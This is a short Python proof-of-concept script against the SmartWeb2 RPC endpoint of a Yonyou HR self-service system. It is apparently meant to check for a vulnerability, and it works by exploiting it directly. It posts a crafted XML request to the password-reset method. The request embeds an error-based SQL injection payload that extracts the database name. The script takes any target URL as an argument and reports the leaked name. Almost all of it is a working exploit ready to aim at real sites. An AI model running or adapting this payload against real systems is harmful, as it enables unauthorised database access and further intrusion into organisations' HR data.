#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()

def verify(site):
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/hrss/dorado/smartweb2.RPC.d?__rpc=true"
    post_data = {
        "__type":"updateData",
        "__viewInstanceId":"nc.bs.hrss.rm.ResetPassword~nc.bs.hrss.rm.ResetPasswordViewModel",
        "__xml": "<rpc transaction=\"10\" method=\"resetPwd\"><def><dataset type=\"Custom\" id=\"dsResetPwd\"><f name=\"user\"></f><f name=\"ID\"></f></dataset></def><data><rs dataset=\"dsResetPwd\"><r id=\"10009\" state=\"insert\"><n><v>1' and substring(sys.fn_sqlvarbasetostr(db_name()),3,32)>0--</v><v>11111111111111111111</v></n></r></rs></data><vps><p name=\"__profileKeys\">findPwd%3B15b021628b8411d33569071324dc1b37</p ></vps></rpc>", 
        "1480658911300":""
    }
    vulnurl = site + payload
    req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
    if req.status_code == 200 and "nvarchar" in req.text:
         info = re.findall("&apos;([^&]+)&apos;", req.text)
         if len(info) != 0:
             return info[0]
    return ""
    

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 yongyou-smartweb2-sql.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，读取 数据库的名称为：", info)
    else:
        print("[-]漏洞不存在")
